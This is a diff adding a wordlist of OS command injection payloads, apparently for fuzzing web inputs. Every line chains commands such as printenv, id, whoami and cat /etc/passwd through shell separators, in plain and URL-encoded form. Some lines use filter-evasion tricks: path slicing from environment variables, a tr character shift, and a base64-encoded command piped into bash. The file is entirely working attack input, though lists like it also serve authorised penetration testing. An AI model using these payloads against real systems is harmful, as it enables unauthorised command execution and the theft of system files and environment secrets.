@@ -1,0 +1,185 @@
+;printenv
+%3bprintenv
+\nprintenv
+%0aprintenv
+&printenv
+%26printenv
+|printenv
+%7cprintenv
+&&printenv
+%26%26printenv
+||printenv
+%7c%7cprintenv
+`printenv`
+%60%60printenv
+$()printenv
+%24%28%29printenv
+ls;printenv
+ls%3bprintenv
+ls\nprintenv
+ls%0aprintenv
+ls&printenv
+ls%26printenv
+ls|printenv
+ls%7cprintenv
+ls&&printenv
+ls%26%26printenv
+ls||printenv
+ls%7c%7cprintenv
+ls`printenv`
+ls%60%60printenv
+ls$()printenv
+ls%24%28%29printenv
+echo${PATH:0:1}etc${PATH:0:1}passwd;ls
+echo${LS_COLORS:10:1}passwd;ls
+$(tr '!-}' '"-~'<<<[);ls
+echo -n 'cat /etc/passwd' | base64;ls
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==);ls
+printenv;id
+printenv%3bid
+printenv\nid
+printenv%0aid
+printenv&id
+printenv%26id
+printenv|id
+printenv%7cid
+printenv&&id
+printenv%26%26id
+printenv||id
+printenv%7c%7cid
+printenv`id`
+printenv%60%60id
+printenv$()id
+printenv%24%28%29id
+ls;id
+ls%3bid
+ls\nid
+ls%0aid
+ls&id
+ls%26id
+ls|id
+ls%7cid
+ls&&id
+ls%26%26id
+ls||id
+ls%7c%7cid
+ls`id`
+ls%60%60id
+ls$()id
+ls%24%28%29id
+echo${PATH:0:1}etc${PATH:0:1}passwd;id
+echo${LS_COLORS:10:1}passwd;id
+$(tr '!-}' '"-~'<<<[);id
+echo -n 'cat /etc/passwd' | base64;id
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==);id
+whoami;printenv
+whoami%3bprintenv
+whoami\nprintenv
+whoami%0aprintenv
+whoami&printenv
+whoami%26printenv
+whoami|printenv
+whoami%7cprintenv
+whoami&&printenv
+whoami%26%26printenv
+whoami||printenv
+whoami%7c%7cprintenv
+whoami`printenv`
+whoami%60%60printenv
+whoami$()printenv
+whoami%24%28%29printenv
+whoami;ls
+whoami%3bls
+whoami\nls
+whoami%0als
+whoami&ls
+whoami%26ls
+whoami|ls
+whoami%7cls
+whoami&&ls
+whoami%26%26ls
+whoami||ls
+whoami%7c%7cls
+whoami`ls`
+whoami%60%60ls
+whoami$()ls
+whoami%24%28%29ls
+echo${PATH:0:1}etc${PATH:0:1}passwd;whoami
+echo${LS_COLORS:10:1}passwd;whoami
+$(tr '!-}' '"-~'<<<[);whoami
+echo -n 'cat /etc/passwd' | base64;whoami
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==);whoami
+cat /etc/passwd;printenv
+cat /etc/passwd%3bprintenv
+cat /etc/passwd\nprintenv
+cat /etc/passwd%0aprintenv
+cat /etc/passwd&printenv
+cat /etc/passwd%26printenv
+cat /etc/passwd|printenv
+cat /etc/passwd%7cprintenv
+cat /etc/passwd&&printenv
+cat /etc/passwd%26%26printenv
+cat /etc/passwd||printenv
+cat /etc/passwd%7c%7cprintenv
+cat /etc/passwd`printenv`
+cat /etc/passwd%60%60printenv
+cat /etc/passwd$()printenv
+cat /etc/passwd%24%28%29printenv
+cat /etc/passwd;ls
+cat /etc/passwd%3bls
+cat /etc/passwd\nls
+cat /etc/passwd%0als
+cat /etc/passwd&ls
+cat /etc/passwd%26ls
+cat /etc/passwd|ls
+cat /etc/passwd%7cls
+cat /etc/passwd&&ls
+cat /etc/passwd%26%26ls
+cat /etc/passwd||ls
+cat /etc/passwd%7c%7cls
+cat /etc/passwd`ls`
+cat /etc/passwd%60%60ls
+cat /etc/passwd$()ls
+cat /etc/passwd%24%28%29ls
+echo${PATH:0:1}etc${PATH:0:1}passwd;cat /etc/passwd
+echo${LS_COLORS:10:1}passwd;cat /etc/passwd
+$(tr '!-}' '"-~'<<<[);cat /etc/passwd
+echo -n 'cat /etc/passwd' | base64;cat /etc/passwd
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==);cat /etc/passwd
+id;printenv
+id%3bprintenv
+id\nprintenv
+id%0aprintenv
+id&printenv
+id%26printenv
+id|printenv
+id%7cprintenv
+id&&printenv
+id%26%26printenv
+id||printenv
+id%7c%7cprintenv
+id`printenv`
+id%60%60printenv
+id$()printenv
+id%24%28%29printenv
+id;ls
+id%3bls
+id\nls
+id%0als
+id&ls
+id%26ls
+id|ls
+id%7cls
+id&&ls
+id%26%26ls
+id||ls
+id%7c%7cls
+id`ls`
+id%60%60ls
+id$()ls
+id%24%28%29ls
+echo${PATH:0:1}etc${PATH:0:1}passwd;id
+echo${LS_COLORS:10:1}passwd;id
+$(tr '!-}' '"-~'<<<[);id
+echo -n 'cat /etc/passwd' | base64;id
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==);id
